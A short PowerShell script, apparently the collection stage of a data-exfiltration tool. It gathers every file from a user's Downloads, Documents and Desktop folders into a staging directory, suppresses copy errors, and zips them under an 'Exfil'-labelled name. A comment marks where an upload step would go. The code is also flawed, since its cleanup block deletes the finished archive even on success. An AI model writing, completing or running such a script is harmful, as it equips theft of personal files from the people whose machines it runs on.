$userFolders = @("$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop")
$zipName = "$env:COMPUTERNAME-Exfil-$(Get-Date -f yyyy-MM-dd_hh-mm).zip"
$tempPath = "$env:TEMP\$zipName"
$stagingDir = "$env:TEMP\ExfilStaging_$(Get-Random)"

try {
    # Validate source folders
    $validFolders = $userFolders | Where-Object { Test-Path $_ }
    if (-not $validFolders) {
        throw "No valid folders found for compression"
    }

    # Create secure staging area
    $stagingDir = New-Item -Path $stagingDir -ItemType Directory -Force | Select-Object -ExpandProperty FullName

    # Copy files to staging
    foreach ($folder in $validFolders) {
        $target = Join-Path $stagingDir ([IO.Path]::GetFileName($folder))
        Copy-Item -Path "$folder\*" -Destination $target -Recurse -Force -ErrorAction SilentlyContinue
    }

    # Configure compression
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    $compressionLevel = [System.IO.Compression.CompressionLevel]::Optimal

    # Create ZIP archive (corrected parameters)
    [System.IO.Compression.ZipFile]::CreateFromDirectory(
        $stagingDir,          # Source directory
        $tempPath,            # Destination ZIP
        $compressionLevel,    # Compression level
        $false                # Exclude base directory
    )

    # Add post-compression actions here (e.g., upload, move, etc.)
    Write-Host "Archive created: $tempPath" -ForegroundColor Green
}
catch {
    Write-Error "Operation failed: $_"
    exit 1
}
finally {
    # Cleanup with error suppression
    if (Test-Path $tempPath) {
        Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
    }
    if (Test-Path $stagingDir) {
        Remove-Item $stagingDir -Recurse -Force -ErrorAction SilentlyContinue
    }
}
